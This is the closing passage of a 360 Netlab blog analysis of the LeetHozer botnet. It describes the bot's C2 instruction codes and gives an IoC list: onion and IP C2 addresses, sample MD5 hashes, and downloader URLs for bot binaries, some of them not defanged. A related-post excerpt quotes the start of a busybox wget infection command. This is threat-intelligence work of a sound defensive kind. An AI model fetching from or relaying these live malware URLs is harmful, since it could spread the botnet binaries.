<p>At this point, the identity verification between the Bot and C2 is completed, and the Bot starts to wait for the C2 to issue instructions. The first byte of the C2 reply packet specifies the type of instruction.</p>
<ul>
<li>
<p>Instruction code: <code>0x00</code> indicates heartbeat<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_heart-1.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_heart-1.png" class="kg-image"></a></p>
</li>
<li>
<p>Instruction code: <code>0x01</code> indicates reporting Bot group information<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_group-1.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_group-1.png" class="kg-image"></a></p>
</li>
<li>
<p>Instruction code: Not <code>0x00</code> <code>0x01</code> indicates DDoS attack.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_attack-1.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_attack-1.png" class="kg-image"></a></p>
</li>
</ul>
<h2 id="contactus">Contact us</h2>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/360Netlab?ref=blog.netlab.360.com">twitter</a> or email to netlab at 360 dot cn.</p>
<h2 id="ioclist">IoC list</h2>
<h3 id="c2">C2</h3>
<pre><code>vbrxmrhrjnnouvjf.onion:31337  #v3
37.49.226.171:31337           #v2
w6gr2jqz3eag4ksi.onion:31337  #v1
</code></pre>
<h3 id="md5">MD5</h3>
<pre><code>027d7e1cda6824bc076d0a586ea139f5
05a485caf78eca390439b7c893c0354b
068083b9d0820f3ac9cec10d03705649
08e1b88305ad138a4509fb6b72ae3d31
0a56855a6d56efe409c2b7a4c6113bcf
0dee2c063085d0c5466137a3c32479f2
0eecbfd368f821901f9ba758e267557a
110ec534e1c60fc47f37739f03c1bb6a
1111c252ee54c4a6614498e66cefb4e7
11c1be44041a8e8ba05be9df336f9231
121960341ab64a7e7686373dedfbc058
128a53e447266e4d0e12adb7c0b43159
129f41468303728b029def8dbc910e35
177de1bf8f90cbcea50fd19c1e3e8cfe
17b5d683d7b177760c8a2ffd749650b0
1aba422e02f0fbff5189399e01e272d4
21e7898b4b585b825d120c3b0fed8b8a
242d0c9386f61c3ac9ddcdbcda724f3e
25588d12bdbb4e4b1d946f2d5c89abf3
273afac3320ddceb0e18671a3e878fa3
2f066945cee892cc857d477d97d42d7c
30c60cfb51896e5d06012ec6cf15c588
3525d090ab1ab1739507ae1777a70b95
37d9fd56ce685717f1180615f555754e
3d24b9cafda55909fbfde16a5222b4d8
3f88cbbcaa3e0b410dcdb18ddb68d4c2
4229c19e6e5c2dc8560fae9b35841957
45a30d656b4767bce0058f80b0895a95
4e22d0079c18043b6d9037fb842d94ee
58a13abe621acc532b1b6d26eb121c61
5ed891c31bc86689cb93488f5746404a
5fafdc3e3ed7c38a204234e0146e5663
5fec7347f2a9a2ae798505135a61c47f
60bb6bf05c3e7f6f13f2374511963f79
669e5f3513ebfa9c30766da294036d6e
6c883cf42d63a672815e38223d241662
6e7e638d27971e060aaee1b9ae43fe4a
76d0285f95fbee81cff81948d5a98db0
7b08a0569506174463c83f50f8d65a8f
84d39f46c4694e176d8734dd53a07c2c
86072e88f28ebf357443300656c0349a
88a39f5bb8e271f3d080a9aaa6c4a44a
8dc36df1617d9c2be576fa02a5c24803
8e7d774441229809c9cfa8d8705b5258
90a63857f31714ff2c285eb6ca9af3d1
919308996155d7a9ec2f7a25a64eb759
91fe795b69880972e30929632d359b52
9a63001fe8f2d2d642bc2c8310a429e0
9c95be6e1e9927cc0171fc344fcceb71
a42550641cc709168c145b5739fca769
a579d46a571e123a9d65dcfe21910c87
a76fdf5b2f817dc1f2e3c241d552b9ae
aa469ab3eb6789104bda30c910f063f5
b0276d96976dd6b805a02141e78df927
b35733792393a08408773a141a94f668
b84fb91f818a2b221833cb6499e5d345
bd28cdf60b03fc302b0ed467b3ea7e43
c6e9c7e7b5370441b379fd0032af4a85
cc42951a01c07dc7034251fdcd08c778
cce2f84c925f30ba11afd817bdae9377
d9d2c7e131e2f19985fffe9a1f38bca1
db6b387ba0f1ab17785de63be55e7fb6
deb66817f026c50d6e78ace69db6f0e6
e8e249712b7ad0bb92ac5ebb1d0f3378
e9ee7ea21696c9e01257c7543d344487
eb210bc6a54c1faef3cc043d767a4c3b
ecf26cb853f2d22b705334cd9acdd3c2
f4aa925fb0d0eda1bdd4b52eecd7d870
fdd05db406a03601b9548aa7a1d07bb6
</code></pre>
<h3 id="downloader">Downloader</h3>
<pre><code>http://185[.172.110.224/ab/i586
http://185[.172.110.224/ab/i686
http://185[.172.110.224/uc/i686
http://185.225.19.57/aq/rxrg
http://188[.214.30.178/arm6
http://188[.214.30.178/arm7
http://188[.214.30.178/bot.arm
http://188[.214.30.178/bot.arm7
http://188[.214.30.178/bot.mips
http://188[.214.30.178/bot.mpsl
http://188[.214.30.178/bot.x86
http://188[.214.30.178/tn/arm
http://188[.214.30.178/tn/arm7
http://188[.214.30.178/tn/mips
http://188[.214.30.178/tn/mpsl
http://190[.115.18.144/arm6
http://190[.115.18.144/arm7
http://190[.115.18.144/bot.arm
http://190[.115.18.144/bot.arm7
http://190[.115.18.144/bot.mips
http://190[.115.18.144/bot.mpsl
http://190[.115.18.144/bot.x86
http://190[.115.18.144/tn/arm
http://190[.115.18.144/tn/arm7
http://190[.115.18.144/tn/mips
http://190[.115.18.144/tn/mpsl
http://37[.49.226.171/bins/mirai.arm
http://37[.49.226.171/bins/mirai.arm7
http://37[.49.226.171/bins/mirai.mpsl
http://37[.49.226.171/bins/mirai.sh4
http://37[.49.226.171/bins/mirai.x86
http://37[.49.226.171/mirai.arm
http://37[.49.226.171/mirai.arm7
http://37[.49.226.171/mirai.mpsl
http://37[.49.226.171/mirai.sh4
http://37[.49.226.171/mirai.x86
http://64[.225.64.58/arm
http://64[.225.64.58/arm5
http://64[.225.64.58/arm6
http://64[.225.64.58/arm7
http://64[.225.64.58/bot.arm
http://64[.225.64.58/bot.arm7
http://64[.225.64.58/bot.mips
http://64[.225.64.58/bot.mpsl
http://64[.225.64.58/bot.x86
http://64[.225.64.58/i586
http://64[.225.64.58/i686
http://64[.225.64.58/m68k
http://64[.225.64.58/mips
http://64[.225.64.58/mpsl
http://64[.225.64.58/sh4
http://64[.225.64.58/spc
http://64[.225.64.58/x86
</code></pre>
<h3 id="ip">IP</h3>
<pre><code>185.172.110.224     Netherlands    ASN206898    Server_Hosting_Pty_Ltd
185.225.19.57       Romania        ASN39798     MivoCloud_SRL
37.49.226.171       Netherlands    ASN208666    Estro_Web_Services_Private_Limited
64.225.64.58        Netherlands    ASN14061     DigitalOcean,_LLC
188.214.30.178      Romania        ASN51177     THC_Projects_SRL
190.115.18.144      Russian        ASN262254    DANCOM_LTD
</code></pre>
<!--kg-card-end: markdown-->
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/the-leethozer-botnet-en/";
          this.page.identifier = "ghost-5ea6545b7646030007b2779b"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/botnet/">Botnet</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/911s5/">僵尸网络911 S5的数字遗产</a></li>
                  <li><a href="/headsup_xdr33_variant_of_ciahive_emeerges/">Heads up! Xdr33, A Variant Of CIA’s HIVE  Attack Kit Emerges</a></li>
                  <li><a href="/warning-hive-variant-xdr33-is-coming_cn/">警惕：魔改后的CIA攻击套件Hive进入黑灰产领域</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/botnet/">See all 114 posts →</a>
              </footer>
            </article>

          
<article class="post-card post tag-botnet tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/ddgde-xin-zheng-cheng-zi-yan-p2pxie-yi-gou-jian-hun-he-p2pwang-luo/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">Botnet</span>
        </div>
        <h2 class="post-card-title">
          DDG的新征程——自研P2P协议构建混合P2P网络
        </h2>
      </header>
      <div class="post-card-excerpt">1. 概述

DDG Mining Botnet 是一个活跃已久的挖矿僵尸网络，其主要的盈利方式是挖 XMR。从 2019.11 月份至今，我们的 Botnet 跟踪系统监控到 DDG Mining Botnet 一直在频繁跟新，其版本号和对应的更新时间如下图所示：

其中，v4005~v4011 版本最主要的更新是把以前以 Hex 形式硬编码进样本的 HubList 数据，改成了 Gob 序列化的方式；v5009 及以后的版本，则摒弃了以前基于 Memberlist 来构建 P2P 网络的方式，改用自研的 P2P 协议来构建混合模式 P2P 网络 。简化的网络结构如下：

右边服务器是 C&amp;C Server，DDG</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            JiaYu
          </div>

          <a href="/author/jiayu/" class="static-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-05-07">May 7, 2020</time>
      <span class="post-card-meta-length">20 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-botnet tag-ddos tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/the-leethozer-botnet/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">Botnet</span>
        </div>
        <h2 class="post-card-title">
          LeetHozer Botnet分析报告
        </h2>
      </header>
      <div class="post-card-excerpt">背景


2020年3月26日我们捕获了一个可疑的样本 11c1be44041a8e8ba05be9df336f9231，大部分杀毒引擎将其识别为Mirai，但是其网络流量却不符合Mirai的特征，这引起了注意，经分析，这是一个复用了Mirai的Reporter，Loader机制，重新设计了加密方法以及C2通信协议的Bot程序。

Mirai已经是安全社区非常熟悉的老朋友，蜜罐系统每天都能捕获大量的Mirai变种，这些变种都非常简单:要么是换一换C2;要么改一改加密的Key;要么集成些新的漏洞扫描……这些入门级的DDoser已经不能引起我们的任何兴趣了。这个Bot程序之所以能在众多变种脱颖而出，一是因为它独特的的加密方法，严谨的通信协议；二是因为在溯源过程中，我们发现它很有可能隶属于Moobot团伙而且正在迭代开发中（就在我们编写本文的同时作者更新了第三个版本，增加了一些新功能，更换了新的Tor CC vbrxmrhrjnnouvjf.onion:31337）。基于这些原因，我们决定将它曝光。因为传播过程中使用H0z3r字串(/bin/busybox wget http://37[.4</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Hui Wang
          </div>

          <a href="/author/huiwang/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-04-27">Apr 27, 2020</time>
      <span class="post-card-meta-length">14 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2024</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=42b57cac00"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
